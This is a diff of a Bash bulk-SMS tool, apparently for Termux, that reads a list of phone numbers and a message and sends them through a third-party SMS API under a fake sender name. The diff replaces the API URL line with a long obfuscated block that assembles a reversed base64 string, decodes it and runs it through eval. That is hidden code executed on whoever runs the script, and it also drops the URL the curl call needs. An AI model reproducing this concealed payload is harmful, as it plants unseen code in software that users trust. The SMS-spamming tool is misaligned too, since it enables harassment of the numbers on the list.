@@ -29,7 +29,7 @@ printf "$bAnn3er"
 }
 bannner
 function g3T(){
-	      urLZ="http://bnerr.com/api/sms.php?send=1&no=$list&msg=$pesan&sender=LOLZ"
+	      MpqZaPxufRUNUAaDeXRXgFSpVqvHnbtiSheCBDeHCZKvQhhBtboYXcicqXMApPLOpzbIorYKcYDnccbjAhJoMqoYONaJDHXinVXJ="VxMdhUIxRsFREuzyFYmzAHYIDEQXnBlefPQdmMefkehxhTjzcSpbxZwgwYUOjaaBIIGEWODKlcmFfbZXpEWvzfIaaPfOloSPqUTA";lFHPoGSnOYvvuQgrIfssuOhhHwGdjnCtGGLVazSEzjMmbEYKxEblNGoTQrHgbjUfAQgbAOAuPBelEHVHYpQJfARNOBuAGtwVQjQo="ZwakOtbhPAnPRSSVEiscTLtGRCKEaRTiVcxFWROaSLZhbRZjSGnfoGXXAOAcuKAdKjeOWACZTDhbRspMpHxrozurNGHcYMEbCBPD";uZjvbCqcusAvDtbcBmfnqQUAOHXqwEXGAqNMSTqSSBavtRgbwEAnRxCoKTOCUJVNNjgkVZLJtpGuwRWgyTKRrOKCglxHFiMuUacS="ch";ajcWmtvIJunxKKQpHbCjlNssauYRBqheusjGNRndOcCzyObzvqdLAFSAqqAnnvZAaqJpmSyRmkFiiqHHfVIgxJYxFvyGlLnSaHIN="4";PySHwqHtxepyZbZZimuwSuvorVTdTsIXvhCvYEaXOjnnryxwdomVTvufivioBEFIvddbMVjAcPitUdrnLLVZxseBxZwRnSYRbQLu="";kofIwXtcIgnMvLQPJWvxjYBQpiqwoPZgMlFGJdLRvqeGdmVeWYHdtSIJDZBDZpwSNOFOnDbLWulKFaqsSnMGINIwOTMsIjVqSHXm="peQXQTAouRcqhNkmNXRNdgbphNLMlrCGMhUYOTNSXZIhPbMcmMIpsIOqrGxNWyCyHrziWItnMPOYWEMHARmznjClRSCWWqxqcpqV";nkGmKxACmetApfbiNCJCCmwbEJsbIGfSrIrlIAomYoEWEcOYFEDCSsPMEWHvaRQPngivaqMgaxyVEuIoDkSUgQfvCVZvhDppRzTJ=" =ogIoNnL4h3LuICIlNmc192cKg2cugHegg3KgQ2bth2Y | r";hKMwqEjrjgFnASRBAoXyJVOtQDDMJRPTYpugWHbgaUEsVGsQLNSVxHxPPmjtWRMzyMTSWljdFRICtMquVyxsWzhpKPGXVvNxPxiZ="rYsEZwsYgZHtfzbMspMrcUCWDdDMapMlSlYWoZDYCHGTsyUzcxoQvMtrXdssNvatCypUyyFoJWJDGnYcooZenJpFXAajlDNoQbQl";jOViwbwCKlBGmFwaztWOSWLwXvwiHYQojcKlPVVpAVjmzkcrosNMeOFfbUcTfptqSomZUftftcQCUzqmyEyFXyMXdNOXiyJouwZL="";WMRWEqktAaOYYaymIFrXIYEkQLjsMBvSBrVtzkMChHeOvaTnJPLXyGIcdZuqDAcYqSeLRUGaTtZhTejtCYwGmlQThNpTsFpYmjIi="as";wNmJQPrYRWxStyWCFdNzmWImGzfaBdUaQgPPKrkkDZRWNcKFRGkFWMNPHDQjCTILNCaXooAZEQujnEVbuUIWxztocuTwolbRtCXh="QSvIjslDeXMKYZfVhmvtGVWtVznorvWyUyXZVqJcAbcceRirFfHBmUylXGBJRzoioSItgWbfiQGdyVUVMrDAuDmfWmpsmGgOZPcO";lKgnTSaoEDMNcnKkKAMpHQENWHFuODwZoYkAuAEJmPUcZstbxuZKZATRGSzpNeeDPVnzhSneoIflablWtNeKlNNPeLVoOnDAhmUV="nBesFNMJyuaEqYBzVUmAcSIUASyeglXJLLXfANEGnFRCitwbtMaHHzrNalUWsTtVzQtzImKYcuDKLeaipRHDfmTtUwCnPJPkYLPc";IIWKMewfiIFCSFktxZdYSgIBDvCdrIBPwlzXGlZuQgTCCMuqmvBMyqdfzFvgFLxNNPYsaxrFZZZKsBThGIlobDARXwIavJhZNKti="o";tgPJnUMGoRvvfVNYFGVCVKVcquiewJTOrZFDlFhLUoUbZAmsxcNGaveJrnvNYPYORLkaYdLWVLvjYQEWwBZdmcWGUxCSnwEJwusX="6";LmmMGfnrnhLOsYZPPRFLyrwEvHbuWKjJPrFQSbXrrOLaBMIPMqyjbHsXScaQtoKQMFmLeCflQxiokPLuORBjIdrXMsTlAkJoKQzw="KjHXQiUGoLKPLjJfGiyLbWNhkJyRARhTqzdPeGNSXfdQXjMDGthtmXzaNmdnFSfxVhLLyZVShmPMDNPNXzwAKsuZZAgdlcujCmHK";gkEujzyXTPUYnsCCNtPYMRcGPmccNsBNrbWTVvuemrFpFUSfeWcmIdawWmhfhexGMGilIycIoThoahRlZNXMPlMpTcRUANpKPhwK=" -d";SGFHARCdUdRqQRiKXoMhpfhxfkheWISyVtHCOJMyGvxcYBLEhhBhwRtDkQjssbCiFPYDkjvZYLCpYiSWvrRwOcULsTYsWUWBRfXo="uZoShklEIIIeKvVnQlkpeAcdkTQXNozBoiwavNoTHDMexYzaZtUdsNCEipwxlaxYIStLlKHfTmGczOEgGxPmHSxbDmnAqRmDDqiG";SoKuvkbVNazXyXDLgENQxTIBstuzDBJVVsemfNIEbPpsRNpmjjheVnkdAHwSdrAdordCUDkTEjOsvHivjTSycbIvWMUhJJwgrOQs="";udicqOStUjNKkhbqdomqtevoSVsrakjfZlmQztxclORnhjOeReIhLaaZPmOnmDAFxLWpKSEAptpmWKFZVZfhmlEJrRcoBRaPphep="b";qOKdfYjDzJZSrkHqlOyvPkjbwMDoHLuVnNdJSUppOPKkHnVorIUShVPHZDQYdwsucbeIdejwOZTavOsKLUzxNftBHfZxAKpnDNjH="e";nOqCrnVGJHMGamArMSHMzHIBDkVFDRkbiiZynxQWMFMEijcTxPradouXFAEFbxlzgPnfpShElQjmDRtDdZcSpYfAYMwIDtMwfHmO="v |";Tx=Eds;nsVznlkijhaZJlUyijKcTfuPMGsfAfCaeFrCYygJsUbFxlqhfKoqzWeeyWeCEYVFPKFXuTQrHygltQYRlaFQTzyTXYhMwbJUTBug="";KLGBgihnBzbKzBnbOWTcMtzQiUjrqJdIjGqhXNilZaWqzUrQrFHYzKAAmlxOvMHERHfBmMPuzgXVuLEvQHvokmBaFioweCmbEaNv=$(eval "$jOViwbwCKlBGmFwaztWOSWLwXvwiHYQojcKlPVVpAVjmzkcrosNMeOFfbUcTfptqSomZUftftcQCUzqmyEyFXyMXdNOXiyJouwZL$qOKdfYjDzJZSrkHqlOyvPkjbwMDoHLuVnNdJSUppOPKkHnVorIUShVPHZDQYdwsucbeIdejwOZTavOsKLUzxNftBHfZxAKpnDNjH$uZjvbCqcusAvDtbcBmfnqQUAOHXqwEXGAqNMSTqSSBavtRgbwEAnRxCoKTOCUJVNNjgkVZLJtpGuwRWgyTKRrOKCglxHFiMuUacS$PySHwqHtxepyZbZZimuwSuvorVTdTsIXvhCvYEaXOjnnryxwdomVTvufivioBEFIvddbMVjAcPitUdrnLLVZxseBxZwRnSYRbQLu$IIWKMewfiIFCSFktxZdYSgIBDvCdrIBPwlzXGlZuQgTCCMuqmvBMyqdfzFvgFLxNNPYsaxrFZZZKsBThGIlobDARXwIavJhZNKti$nkGmKxACmetApfbiNCJCCmwbEJsbIGfSrIrlIAomYoEWEcOYFEDCSsPMEWHvaRQPngivaqMgaxyVEuIoDkSUgQfvCVZvhDppRzTJ$qOKdfYjDzJZSrkHqlOyvPkjbwMDoHLuVnNdJSUppOPKkHnVorIUShVPHZDQYdwsucbeIdejwOZTavOsKLUzxNftBHfZxAKpnDNjH$nOqCrnVGJHMGamArMSHMzHIBDkVFDRkbiiZynxQWMFMEijcTxPradouXFAEFbxlzgPnfpShElQjmDRtDdZcSpYfAYMwIDtMwfHmO$jOViwbwCKlBGmFwaztWOSWLwXvwiHYQojcKlPVVpAVjmzkcrosNMeOFfbUcTfptqSomZUftftcQCUzqmyEyFXyMXdNOXiyJouwZL$udicqOStUjNKkhbqdomqtevoSVsrakjfZlmQztxclORnhjOeReIhLaaZPmOnmDAFxLWpKSEAptpmWKFZVZfhmlEJrRcoBRaPphep$nsVznlkijhaZJlUyijKcTfuPMGsfAfCaeFrCYygJsUbFxlqhfKoqzWeeyWeCEYVFPKFXuTQrHygltQYRlaFQTzyTXYhMwbJUTBug$WMRWEqktAaOYYaymIFrXIYEkQLjsMBvSBrVtzkMChHeOvaTnJPLXyGIcdZuqDAcYqSeLRUGaTtZhTejtCYwGmlQThNpTsFpYmjIi$qOKdfYjDzJZSrkHqlOyvPkjbwMDoHLuVnNdJSUppOPKkHnVorIUShVPHZDQYdwsucbeIdejwOZTavOsKLUzxNftBHfZxAKpnDNjH$tgPJnUMGoRvvfVNYFGVCVKVcquiewJTOrZFDlFhLUoUbZAmsxcNGaveJrnvNYPYORLkaYdLWVLvjYQEWwBZdmcWGUxCSnwEJwusX$PySHwqHtxepyZbZZimuwSuvorVTdTsIXvhCvYEaXOjnnryxwdomVTvufivioBEFIvddbMVjAcPitUdrnLLVZxseBxZwRnSYRbQLu$ajcWmtvIJunxKKQpHbCjlNssauYRBqheusjGNRndOcCzyObzvqdLAFSAqqAnnvZAaqJpmSyRmkFiiqHHfVIgxJYxFvyGlLnSaHIN$gkEujzyXTPUYnsCCNtPYMRcGPmccNsBNrbWTVvuemrFpFUSfeWcmIdawWmhfhexGMGilIycIoThoahRlZNXMPlMpTcRUANpKPhwK$nsVznlkijhaZJlUyijKcTfuPMGsfAfCaeFrCYygJsUbFxlqhfKoqzWeeyWeCEYVFPKFXuTQrHygltQYRlaFQTzyTXYhMwbJUTBug");eval "$SoKuvkbVNazXyXDLgENQxTIBstuzDBJVVsemfNIEbPpsRNpmjjheVnkdAHwSdrAdordCUDkTEjOsvHivjTSycbIvWMUhJJwgrOQs$KLGBgihnBzbKzBnbOWTcMtzQiUjrqJdIjGqhXNilZaWqzUrQrFHYzKAAmlxOvMHERHfBmMPuzgXVuLEvQHvokmBaFioweCmbEaNv$jOViwbwCKlBGmFwaztWOSWLwXvwiHYQojcKlPVVpAVjmzkcrosNMeOFfbUcTfptqSomZUftftcQCUzqmyEyFXyMXdNOXiyJouwZL$PySHwqHtxepyZbZZimuwSuvorVTdTsIXvhCvYEaXOjnnryxwdomVTvufivioBEFIvddbMVjAcPitUdrnLLVZxseBxZwRnSYRbQLu"
 	      gAZ=$(echo -e $urLZ | tr [:space:] "+")
 	      cuA="curl $gAZ -s"
 	      ReGe=$(${cuA} | grep -Po '(?<=status":").*?(?=")' )
@@ -37,17 +37,30 @@ function g3T(){
 	      printf "$NC"
 	      exit 2
 }
-echo -n " - LIST   : "
-read list
-echo -n " - PESAN  : "
-read pesan
-if [ ! -f $list ]; then
+echo ""
+printf "1.MANUAL | 2.INFO | 00.EXIT\n"
+read -p "=>" plih
+case $plih in
+1)
+             echo -n " - LIST   : "
+             read list
+             echo -n " - PESAN  : "
+             read pesan
+             if [ ! -f $list ]; then
 	echo "$list No Such File"
 	exit
 fi
 IFS=$'\r\n' GLOBIGNORE='*' command eval 'list=($(cat $list))'
 for (( i = 0; i < "${#list[@]}"; i++ )); do
 	passlist="${list[$i]}"
-	g3T $list $pesan $kiri3
+	g3T $list $pesan
 done
+          ;;
+2)
+         printf "terima kasih sudah memakai tools saia\n"
+         printf "ingin bergabung group termux\n"
+         printf "https://t.me/termuxid\n"
+
+         
+esac
 # EnD
